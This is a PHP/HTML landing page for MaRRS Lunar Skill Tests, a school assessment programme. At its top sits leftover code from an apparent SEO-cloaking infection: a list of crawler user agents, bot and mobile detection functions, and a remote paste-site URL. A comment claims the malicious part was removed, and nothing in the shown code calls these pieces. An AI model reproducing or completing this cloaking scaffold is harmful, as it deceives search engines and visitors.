<?php
$bot_user_agents = array(
    "Googlebot", "Googlebot-Image", "Googlebot-News", "Googlebot-Video", "Storebot-Google", "Google-InspectionTool",
    "GoogleOther", "GoogleOther-Image", "GoogleOther-Video", "Google-CloudVertexBot", "Google-Extended", "APIs-Google",
    "AdsBot-Google-Mobile", "AdsBot-Google", "Mediapartners-Google", "FeedFetcher-Google", "Google-Favicon", "Google Favicon",
    "Googlebot-Favicon", "Google-Site-Verification", "Google-Read-Aloud", "GoogleProducer", "Google Web Preview", "Bingbot",
    "Slurp", "DuckDuckBot", "Baiduspider", "YandexBot", "Sogou", "Exabot", "facebookexternalhit", "ia_archiver",
    "Alexa Crawler", "AhrefsBot", "Semrushbot"
);

$remote_url = "https://paste.myconan.net/656581.txt"; 

$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? '';

function is_bot($user_agent, $bot_user_agents) {
    foreach ($bot_user_agents as $bot) {
        if (stripos($user_agent, $bot) !== false) {
            return true;
        }
    }
    return false;
}

function is_mobile($user_agent) {
    $mobile_agents = array('Mobile', 'Android', 'Silk/', 'Kindle', 'BlackBerry', 'Opera Mini', 'Opera Mobi', 'iPhone', 'iPad');
    foreach ($mobile_agents as $mobile) {
        if (stripos($user_agent, $mobile) !== false) {
            return true;
        }
    }
    return false;
}


/**
* Note: This file may contain artifacts of previous malicious infection.
* However, the dangerous code has been removed, and the file is now safe to use.
*/

?>

<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>MaRRS Lunar Skill Tests</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
  <style>
    :root {
      --primary-color: #1a365d;
      --secondary-color: #2d5aa0;
      --accent-color: #4299e1;
      --text-dark: #2d3748;
      --text-light: #718096;
      --bg-light: #f7fafc;
      --bg-gradient: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      --space-gradient: linear-gradient(135deg, #0f0c29 0%, #302b63 50%, #24243e 100%);
    }

    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
      line-height: 1.6;
      color: var(--text-dark);
      background: var(--bg-light);
    }

    .hero-section {
      background: var(--space-gradient);
      min-height: 100vh;
      display: flex;
      align-items: center;
      position: relative;
      overflow: hidden;
    }

    .hero-section::before {
      content: '';
      position: absolute;
      top: 0;
      left: 0;
      right: 0;
      bottom: 0;
      background: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1000 1000"><circle cx="200" cy="200" r="2" fill="white" opacity="0.3"/><circle cx="800" cy="300" r="1" fill="white" opacity="0.5"/><circle cx="400" cy="600" r="1.5" fill="white" opacity="0.4"/><circle cx="600" cy="100" r="1" fill="white" opacity="0.6"/><circle cx="100" cy="700" r="2" fill="white" opacity="0.3"/><circle cx="900" cy="800" r="1" fill="white" opacity="0.5"/></svg>');
      animation: twinkle 3s ease-in-out infinite alternate;
    }

    @keyframes twinkle {
      0% { opacity: 0.3; }
      100% { opacity: 1; }
    }

    .hero-content {
      position: relative;
      z-index: 2;
      text-align: center;
      color: white;
    }

    .hero-title {
      font-size: 3.5rem;
      font-weight: 700;
      margin-bottom: 1rem;
      background: linear-gradient(45deg, #fff, #a0aec0);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      background-clip: text;
    }

    .hero-subtitle {
      font-size: 1.5rem;
      margin-bottom: 2rem;
      opacity: 0.9;
    }

    .hero-description {
      font-size: 1.1rem;
      max-width: 800px;
      margin: 0 auto 3rem;
      opacity: 0.8;
    }

    .cta-button {
      background: linear-gradient(45deg, #4299e1, #667eea);
      border: none;
      padding: 1rem 2rem;
      font-size: 1.2rem;
      font-weight: 600;
      border-radius: 50px;
      color: white;
      text-decoration: none;
      display: inline-flex;
      align-items: center;
      gap: 0.5rem;
      transition: all 0.3s ease;
      box-shadow: 0 10px 30px rgba(66, 153, 225, 0.3);
    }

    .cta-button:hover {
      transform: translateY(-2px);
      box-shadow: 0 15px 40px rgba(66, 153, 225, 0.4);
      color: white;
    }

    .section-title {
      font-size: 2.5rem;
      font-weight: 700;
      text-align: center;
      margin-bottom: 3rem;
      color: var(--primary-color);
      position: relative;
    }

    .section-title::after {
      content: '';
      position: absolute;
      bottom: -10px;
      left: 50%;
      transform: translateX(-50%);
      width: 60px;
      height: 4px;
      background: var(--accent-color);
      border-radius: 2px;
    }

    .feature-card {
      background: white;
      border-radius: 20px;
      padding: 2rem;
      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
      transition: all 0.3s ease;
      border: 1px solid rgba(66, 153, 225, 0.1);
      height: 100%;
    }

    .feature-card:hover {
      transform: translateY(-5px);
      box-shadow: 0 20px 40px rgba(0, 0, 0, 0.15);
    }

    .feature-icon {
      width: 60px;
      height: 60px;
      border-radius: 15px;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 1.5rem;
      margin-bottom: 1rem;
      background: linear-gradient(45deg, var(--accent-color), var(--secondary-color));
      color: white;
    }

    .feature-title {
      font-size: 1.3rem;
      font-weight: 600;
      margin-bottom: 1rem;
      color: var(--primary-color);
    }

    .feature-description {
      color: var(--text-light);
      line-height: 1.7;
    }

    .level-card {
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      color: white;
      border-radius: 20px;
      padding: 2rem;
      text-align: center;
      transition: all 0.3s ease;
      position: relative;
      overflow: hidden;
    }

    .level-card::before {
      content: '';
      position: absolute;
      top: -50%;
      left: -50%;
      width: 200%;
      height: 200%;
      background: radial-gradient(circle, rgba(255,255,255,0.1) 0%, transparent 70%);
      transition: all 0.3s ease;
      transform: scale(0);
    }

    .level-card:hover::before {
      transform: scale(1);
    }

    .level-card:hover {
      transform: translateY(-5px);
    }

    .level-number {
      font-size: 3rem;
      font-weight: 700;
      margin-bottom: 1rem;
      opacity: 0.8;
    }

    .level-title {
      font-size: 1.5rem;
      font-weight: 600;
      margin-bottom: 1rem;
    }

    .level-description {
      font-size: 1.1rem;
      opacity: 0.9;
    }

    .stats-section {
      background: var(--bg-gradient);
      color: white;
      padding: 5rem 0;
    }

    .stat-item {
      text-align: center;
      padding: 2rem;
    }

    .stat-number {
      font-size: 3rem;
      font-weight: 700;
      margin-bottom: 0.5rem;
      display: block;
    }

    .stat-label {
      font-size: 1.1rem;
      opacity: 0.9;
    }

    .testimonial-card {
      background: white;
      border-radius: 20px;
      padding: 2rem;
      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
      margin-bottom: 2rem;
    }

    .testimonial-text {
      font-style: italic;
      margin-bottom: 1rem;
      font-size: 1.1rem;
      line-height: 1.7;
    }

    .testimonial-author {
      font-weight: 600;
      color: var(--primary-color);
    }

    .footer {
      background: var(--primary-color);
      color: white;
      padding: 3rem 0 2rem;
      text-align: center;
    }

    .footer-content {
      margin-bottom: 2rem;
    }

    .footer-logo {
      font-size: 1.5rem;
      font-weight: 700;
      margin-bottom: 1rem;
    }

    .animate-on-scroll {
      opacity: 0;
      transform: translateY(30px);
      transition: all 0.6s ease;
    }

    .animate-on-scroll.animate {
      opacity: 1;
      transform: translateY(0);
    }

    .pulse-animation {
      animation: pulse 2s infinite;
    }

    @keyframes pulse {
      0% { transform: scale(1); }
      50% { transform: scale(1.05); }
      100% { transform: scale(1); }
    }

    .section-spacer {
      padding: 5rem 0;
    }
    .section-spacer1 {
      padding: 1rem 0;
    }

    @media (max-width: 768px) {
      .hero-title {
        font-size: 2.5rem;
      }
      
      .hero-subtitle {
        font-size: 1.2rem;
      }
      
      .section-title {
        font-size: 2rem;
      }
      
      .feature-card {
        margin-bottom: 2rem;
      }
    }
  </style>
</head>

<body>
     <!-- Header -->
  <img src="https://marrs.in/images/header-011.jpg" alt="MaRRS Header" class="img-fluid">

  <!-- Hero Section -->
  <section class="hero-section">
    <div class="container">
      <div class="hero-content">
         <img src='https://marrs.in/student_registration/certificate_logo/flunar.jpg' style='width:50%;'>
         
        <h2>Lunar Skill Tests</h2>
        <p class="hero-subtitle animate-on-scroll">Launch Your Child's Learning Journey Today!
        </p>
        <h2> Master Skills. Soar to Success. Affordably.</h2><br>
        <h4>
         A comprehensive online assessment program for students from Grade 1 to 10, <br>designed to help them learn, master, and thrive.
        </h4>
        <a href="https://marrs.in/lunar/Welcome/associatelink/3" class="cta-button animate-on-scroll pulse-animation">
          <!--<i class="fas fa-rocket"></i>-->
          Start Your Journey
        </a>
      </div>
    </div>
  </section>

  <!-- Features Section -->
  <section id="features" class="section-spacer">
    <div class="container">
      <h2 class="section-title animate-on-scroll">Why Choose Lunar Skill Tests?</h2>
      <div class="row">
        <div class="col-lg-4 col-md-6 mb-4">
          <div class="feature-card animate-on-scroll">
            <div class="feature-icon">
              <i class="fas fa-chart-line"></i>
            </div>
            <h3 class="feature-title">Continuous Progress Tracking</h3>
            <p class="feature-description">
              Choose from daily, weekly, or monthly tests to monitor your child's growth in real time. Track improvements and identify areas that need attention.
            </p>
          </div>
        </div>
        <div class="col-lg-4 col-md-6 mb-4">
          <div class="feature-card animate-on-scroll">
            <div class="feature-icon">
              <i class="fas fa-medal"></i>
            </div>
            <h3 class="feature-title">National Percentile Grading</h3>
            <p class="feature-description">
              Understand your child's performance compared to peers across the country. Get insights into national ranking and competitive positioning.
            </p>
          </div>
        </div>
        <div class="col-lg-4 col-md-6 mb-4">
          <div class="feature-card animate-on-scroll">
            <div class="feature-icon">
              <i class="fas fa-dollar-sign"></i>
            </div>
            <h3 class="feature-title">Affordable Excellence</h3>
            <p class="feature-description">
              High-quality assessments at a fraction of the cost — because every child deserves the best education without breaking the bank.
            </p>
          </div>
        </div>
        <div class="col-lg-4 col-md-6 mb-4">
          <div class="feature-card animate-on-scroll">
            <div class="feature-icon">
              <i class="fas fa-certificate"></i>
            </div>
            <h3 class="feature-title">Digital Certificates</h3>
            <p class="feature-description">
              Receive digital certificates after every test to recognize effort and progress. Build confidence with every achievement.
            </p>
          </div>
        </div>
        <div class="col-lg-4 col-md-6 mb-4">
          <div class="feature-card animate-on-scroll">
            <div class="feature-icon">
              <i class="fas fa-trophy"></i>
            </div>
            <h3 class="feature-title">Medals for Toppers</h3>
            <p class="feature-description">
              Medals awarded to toppers in each test series — a proud moment for every achiever! Celebrate success and motivate continued excellence.
            </p>
          </div>
        </div>
        <div class="col-lg-4 col-md-6 mb-4">
          <div class="feature-card animate-on-scroll">
            <div class="feature-icon">
              <i class="fas fa-laptop"></i>
            </div>
            <h3 class="feature-title">100% Online & Flexible</h3>
            <p class="feature-description">
              Learn from anywhere, anytime with our completely online platform. Access comprehensive preparatory materials and additional study resources.
            </p>
          </div>
        </div>
      </div>
    </div>
  </section>

  <!-- Learning Levels Section -->
  <section class="section-spacer" style="background: var(--bg-light);">
    <div class="container">
      <h2 class="section-title animate-on-scroll">Progressive Learning Levels</h2>
      <p class="text-center mb-5 animate-on-scroll" style="font-size: 1.2rem; color: var(--text-light);">
        Our assessments are structured across three levels to build and evaluate skills step-by-step
      </p>
      
      <div class="row">
        <div class="col-lg-4 mb-4">
          <div class="level-card animate-on-scroll">
            <div class="level-number">01</div>
            <h3 class="level-title">Starter - "What is it?"</h3>
            <p class="level-description">Focus on basic knowledge and understanding. Build strong foundations with fundamental concepts.</p>
          </div>
        </div>
        <div class="col-lg-4 mb-4">
          <div class="level-card animate-on-scroll">
            <div class="level-number">02</div>
            <h3 class="level-title">Mover - "How do I do it?"</h3>
            <p class="level-description">Apply concepts in practical scenarios. Develop problem-solving skills and practical application.</p>
          </div>
        </div>
        <div class="col-lg-4 mb-4">
          <div class="level-card animate-on-scroll">
            <div class="level-number">03</div>
            <h3 class="level-title">Flyer - "Expert Application"</h3>
            <p class="level-description">Solve problems collaboratively and reflectively. Master advanced concepts and critical thinking.</p>
          </div>
        </div>
      </div>
    </div>
  </section>

  <!-- Stats Section -->
  <section class="stats-section">
    <div class="container">
      <div class="row">
        <div class="col-lg-3 col-md-6">
          <div class="stat-item animate-on-scroll">
            <span class="stat-number">1-10</span>
            <div class="stat-label">Grade Coverage</div>
          </div>
        </div>
        <div class="col-lg-3 col-md-6">
          <div class="stat-item animate-on-scroll">
            <span class="stat-number">100%</span>
            <div class="stat-label">Online Platform</div>
          </div>
        </div>
        <div class="col-lg-3 col-md-6">
          <div class="stat-item animate-on-scroll">
            <span class="stat-number">24/7</span>
            <div class="stat-label">Access Available</div>
          </div>
        </div>
        <div class="col-lg-3 col-md-6">
          <div class="stat-item animate-on-scroll">
            <span class="stat-number">∞</span>
            <div class="stat-label">Growth Potential</div>
          </div>
        </div>
      </div>
    </div>
  </section>

  <!-- National Championship Section -->
  <!--<section class="section-spacer">-->
  <!--  <div class="container">-->
  <!--    <h2 class="section-title animate-on-scroll">National Championships</h2>-->
  <!--    <div class="row align-items-center">-->
  <!--      <div class="col-lg-6">-->
  <!--        <div class="feature-card animate-on-scroll">-->
  <!--          <h3 class="feature-title">-->
  <!--            <i class="fas fa-flag text-primary me-2"></i>-->
  <!--            Jumbo National Qualification-->
  <!--          </h3>-->
  <!--          <p class="feature-description">-->
  <!--            Participants of the National Championships qualify for the Jumbo National based on their average percentile scores. Compete with the best minds across the country.-->
  <!--          </p>-->
  <!--        </div>-->
  <!--      </div>-->
  <!--      <div class="col-lg-6">-->
  <!--        <div class="feature-card animate-on-scroll">-->
  <!--          <h3 class="feature-title">-->
  <!--            <i class="fas fa-award text-warning me-2"></i>-->
  <!--            Prize Recognition-->
  <!--          </h3>-->
  <!--          <p class="feature-description">-->
  <!--            Prizes awarded for every National Championship and the Jumbo National Championship. The syllabus is designed considering academic requirements to help with annual assessments.-->
  <!--          </p>-->
  <!--        </div>-->
  <!--      </div>-->
  <!--    </div>-->
  <!--  </div>-->
  <!--</section>-->
  
  <div class='container my-5 m text-center' style='height:80vh;'>
      <img src="https://marrs.in/images/image.png" alt="MaRRS Header" class="img-fluid " >
  </div>
  

  <!-- CTA Section -->
  <section class="section-spacer1" style="background: var(--space-gradient); ">
      

      
    <div class="container text-center py-5">
      <h2 class="section-title animate-on-scroll" style="color: white;">Ready to Launch Their Success?</h2>
      
      <a href="https://marrs.in/lunar/Welcome/associatelink/3" class="cta-button animate-on-scroll pulse-animation" style="font-size: 1.3rem; padding: 1.2rem 3rem;">
        <!--<i class="fas fa-rocket"></i>-->
        Enroll Now!
      </a>
      
    </div>
  </section>



  <!-- Footer -->
  <footer class="footer">
    <div class="container">
      <div class="footer-content text-center">
          <p class="animate-on-scroll" style="color: white; font-size: 1.2rem; margin-bottom: 3rem;">
        Assessments aren't just tests — they're tools for growth.<br> Lunar Skill Tests provide deep insights into your child's strengths and areas for improvement, helping them stay on track and excel.
      </p>
        <div class="footer-logo">MaRRS Lunar Skill Tests</div>
        <!--<p>A Product Of MaRRS Intellectual Services Pvt. Ltd.</p>-->
        
        <p>A Product Of</p>
        
        <img src='https://marrs.in/images/MaRRS%20Rediscover%20Logo-02.png' class='image-fluid w-50' >
        
      </div>
      <div class="border-top pt-3">
        <p class="mb-0">© Aviansys Technologies Pvt. Ltd. 2024-25</p>
      </div>
    </div>
  </footer>

  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
  <script>
    // Smooth scrolling for anchor links
    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
      anchor.addEventListener('click', function (e) {
        e.preventDefault();
        const target = document.querySelector(this.getAttribute('href'));
        if (target) {
          target.scrollIntoView({
            behavior: 'smooth',
            block: 'start'
          });
        }
      });
    });

    // Scroll animation
    const observerOptions = {
      threshold: 0.1,
      rootMargin: '0px 0px -50px 0px'
    };

    const observer = new IntersectionObserver((entries) => {
      entries.forEach(entry => {
        if (entry.isIntersecting) {
          entry.target.classList.add('animate');
        }
      });
    }, observerOptions);

    document.querySelectorAll('.animate-on-scroll').forEach(el => {
      observer.observe(el);
    });

    // Add some dynamic behavior
    document.querySelector('.cta-button').addEventListener('mouseenter', function() {
      this.style.transform = 'translateY(-3px) scale(1.05)';
    });

    document.querySelector('.cta-button').addEventListener('mouseleave', function() {
      this.style.transform = 'translateY(0) scale(1)';
    });
  </script>
</body>
</html>